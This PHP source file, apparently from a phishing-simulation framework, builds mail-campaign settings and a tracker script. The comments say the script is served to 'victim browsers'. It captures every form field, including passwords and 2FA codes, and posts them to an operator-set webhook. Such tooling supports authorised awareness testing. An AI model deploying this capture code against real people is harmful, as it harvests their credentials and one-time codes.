<?php
/**
 * Phase 3.57 — Quick-Start full-funnel wizard: pure builder helpers.
 *
 * These functions are intentionally DB-free and session-free so they can be
 * loaded by tests/Support/helpers_shim.php and unit-tested in isolation. They
 * produce the exact column payloads the dispatcher then INSERTs.
 *
 *  - taphish_wizard_build_minimal_tracker(): builds the minimal but functional
 *    web-tracker payload (tracker_step_data JSON + content_html JSON +
 *    content_js string) consistent with what spear/js/web_tracker_generator_
 *    function.js produces and what mod.php (?tlink=ID) serves. The content_js
 *    posts a page-visit on load and every form submit to <webhook>/track,
 *    including tracker_id + the rid from the URL — the shape track.php expects.
 *
 *  - taphish_wizard_build_campaign_data(): builds the campaign_data structure
 *    the mail-campaign runner consumes (mirrors mail_campaign.js / saveCampaign-
 *    List), fully linked from the IDs/names the wizard collected.
 */

if (!function_exists('taphish_wizard_build_minimal_tracker')) {
    /**
     * Build a minimal, functional web-tracker payload.
     *
     * @param string $tracker_id   6+ char alnum id (also embedded in the JS)
     * @param string $tracker_name human label
     * @param string $webhook_url  base URL whose /track endpoint receives posts
     *                             (e.g. https://host/track.php — the trailing
     *                             /track.php or slashes are normalized away so
     *                             the JS posts to "<base>/track", as the
     *                             existing generator does)
     * @param array<int,string> $formFields ordered list of the field names a
     *                             capture landing collects across its funnel
     *                             (e.g. ['email','password','code_2fa']). When
     *                             non-empty, the tracker is built with one
     *                             cumulative page per field — page 1 declares
     *                             field[0], page 2 field[0..1], etc. — so each
     *                             captured step surfaces in the Web-Tracker
     *                             report as a named `Field-<name>` column
     *                             instead of being stored but invisible. Empty
     *                             (default) keeps the original single visit-only
     *                             page — fully backward compatible.
     * @return array{tracker_step_data:string, content_html:string, content_js:string}
     */
    function taphish_wizard_build_minimal_tracker(string $tracker_id, string $tracker_name, string $webhook_url, array $formFields = []): array
    {
        // Normalize the webhook base the same way the JS generator does:
        // strip a trailing /track.php and any surrounding slashes, then the JS
        // posts to "<base>/track" (mod.php / track.php both answer there).
        $base = trim($webhook_url);
        $base = preg_replace('#/track(?:\.php)?/?$#i', '', $base) ?? $base;
        $base = rtrim($base, '/');

        // --- tracker_step_data: same top-level shape the generator saves ---
        // ('start' + 'trackers' + 'web_forms'{count,data[]}). Without declared
        // capture fields we keep the original single visit-only page (minimal,
        // schema-compatible). With fields we emit one cumulative page per field
        // so the report can render a `Field-<name>` column for each captured
        // step (the report reads wf_data.form_fields_and_values[*].idname).
        $formFields = array_values(array_filter(
            array_map(static fn ($f): string => trim((string) $f), $formFields),
            static fn (string $f): bool => $f !== ''
        ));

        if ($formFields === []) {
            $webFormsData = [[
                'page_name'              => 'Landing page',
                'page_url'               => $base . '/#',
                'link_next_page'         => false,
                'next_page_url'          => '#',
                'form_fields_and_values' => new stdClass(),
            ]];
        } else {
            $webFormsData = [];
            $cumulative   = [];
            $last         = count($formFields) - 1;
            foreach ($formFields as $i => $field) {
                $cumulative[] = $field;
                // Each declared field becomes {idname:<name>}; the report keys
                // its column off idname and matches the captured form_field_data
                // entry of the same name. 'FSB' (form submit button) is the
                // generator's reserved key and is skipped by the report.
                $ffv = [];
                foreach ($cumulative as $f) {
                    $ffv[$f] = ['idname' => $f];
                }
                $ffv['FSB'] = ['idname' => 'submit'];
                $webFormsData[] = [
                    'page_name'              => 'Step ' . ($i + 1) . ' (' . $field . ')',
                    'page_url'               => $i === 0 ? $base . '/#' : '#',
                    'link_next_page'         => $i !== $last,
                    'next_page_url'          => '#',
                    'form_fields_and_values' => $ffv,
                ];
            }
        }

        $tracker_step_data = [
            'start' => [
                'tb_tracker_name'      => $tracker_name,
                'selector_webhook_type'=> 'custom',
                'tb_webhook_url'       => $base,
                'cb_auto_ativate'      => true,
            ],
            'trackers' => new stdClass(),
            'web_forms' => [
                'count' => count($webFormsData),
                'data'  => $webFormsData,
            ],
        ];

        // --- content_js: minimal but functional tracker script ---
        // Mirrors the generator's runtime contract: read rid from the URL,
        // keep a session cookie, POST a page-visit (page:0) on load and a
        // form-submit (page:1) for every <form> submit, to <base>/track.
        // JSON-encode both interpolated values so an operator-supplied name or
        // host that contains a quote / </script> / backslash cannot break out
        // of the JS string literal (the script is served to victim browsers).
        $tracker_id_js = json_encode($tracker_id, JSON_UNESCAPED_SLASHES | JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);
        $webhook_js    = json_encode($base . '/track', JSON_UNESCAPED_SLASHES | JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);
        $js = <<<JS
(function(){
  var tracker_id = {$tracker_id_js};
  var webhook = {$webhook_js};
  var sess_id = "";
  var rid = "";
  try {
    var m = window.location.search.match(/[?&]rid=([^&]+)/);
    rid = m ? decodeURIComponent(m[1]) : "";
  } catch (e) { rid = ""; }

  // session cookie (reuse if present)
  try {
    if (document.cookie.indexOf("tsess_id=") >= 0) {
      var parts = document.cookie.split(";");
      for (var i = 0; i < parts.length; i++) {
        var kv = parts[i].split("=");
        if (kv[0].replace(/^\s+|\s+$/g, "") === "tsess_id") sess_id = kv[1];
      }
    } else {
      sess_id = Math.random().toString(36).substring(2);
      document.cookie = "tsess_id=" + sess_id + ";SameSite=Lax";
    }
  } catch (e) { sess_id = Math.random().toString(36).substring(2); }

  function post(body) {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open("POST", webhook, true);
      xhr.send(JSON.stringify(body));
    } catch (e) {}
  }

  function trackVisit() {
    post({
      page: 0,
      trackerId: tracker_id,
      sess_id: sess_id,
      screen_res: (screen.width + "x" + screen.height),
      rid: rid,
      ip_info: ""
    });
  }

  function trackSubmit(form) {
    var field_data = {};
    try {
      var els = form.querySelectorAll("input,textarea,select");
      for (var i = 0; i < els.length; i++) {
        var el = els[i];
        var t = (el.type || "").toLowerCase();
        if (t === "submit" || t === "button" || t === "hidden") continue;
        var name = el.name || el.id;
        if (!name) continue;
        if (t === "checkbox" || t === "radio") field_data[name] = el.checked;
        else field_data[name] = el.value;
      }
    } catch (e) {}
    post({
      page: 1,
      trackerId: tracker_id,
      sess_id: sess_id,
      screen_res: (screen.width + "x" + screen.height),
      form_field_data: field_data,
      rid: rid,
      ip_info: ""
    });
  }

  function onReady() {
    trackVisit();
    var forms = document.getElementsByTagName("form");
    for (var i = 0; i < forms.length; i++) {
      (function(form){
        if (form.addEventListener) form.addEventListener("submit", function(){ trackSubmit(form); }, true);
        else if (form.attachEvent) form.attachEvent("onsubmit", function(){ trackSubmit(form); });
      })(forms[i]);
    }
  }

  if (document.addEventListener) document.addEventListener("DOMContentLoaded", onReady);
  else if (document.attachEvent) document.attachEvent("onreadystatechange", function(){ if (document.readyState === "complete") onReady(); });
  else onReady();
})();
JS;

        // content_html mirrors saveWebTracker(): a JSON object keyed by page
        // index holding the per-page HTML preview. Minimal tracker → empty
        // form HTML per page (one entry per web_forms page).
        $content_html = json_encode(
            array_fill(0, max(1, count($webFormsData)), ''),
            JSON_UNESCAPED_SLASHES
        );

        return [
            'tracker_step_data' => (string) json_encode($tracker_step_data, JSON_UNESCAPED_SLASHES),
            'content_html'      => (string) $content_html,
            'content_js'        => $js,
        ];
    }
}

if (!function_exists('taphish_wizard_build_campaign_data')) {
    /**
     * Build the fully-linked campaign_data structure the mail-campaign runner
     * consumes. Mirrors the shape produced by spear/js/mail_campaign.js and
     * read back by mail_campaign_manager.php (user_group/mail_template/
     * mail_template_b/mail_sender/mail_config/msg_interval/msg_fail_retry/notes).
     *
     * Pure: takes already-resolved ids + names.
     *
     * @param array{
     *   user_group_id:string, user_group_name:string,
     *   mail_template_id:string, mail_template_name:string,
     *   sender_list_id:string, sender_name:string,
     *   notes?:string, msg_interval?:string, msg_fail_retry?:string
     * } $refs
     * @return array
     */
    function taphish_wizard_build_campaign_data(array $refs): array
    {
        return [
            'user_group' => [
                'id'   => (string) ($refs['user_group_id'] ?? ''),
                'name' => (string) ($refs['user_group_name'] ?? ''),
            ],
            'mail_template' => [
                'id'   => (string) ($refs['mail_template_id'] ?? ''),
                'name' => (string) ($refs['mail_template_name'] ?? ''),
            ],
            'mail_template_b' => null,
            'mail_sender' => [
                'id'   => (string) ($refs['sender_list_id'] ?? ''),
                'name' => (string) ($refs['sender_name'] ?? ''),
            ],
            'mail_config' => [
                'id'   => 'default',
                'name' => 'default',
            ],
            'msg_interval'   => (string) ($refs['msg_interval'] ?? '0000-0000'),
            'msg_fail_retry' => (string) ($refs['msg_fail_retry'] ?? '2'),
            'notes'          => (string) ($refs['notes'] ?? 'Created by Quick-Start Wizard'),
        ];
    }
}
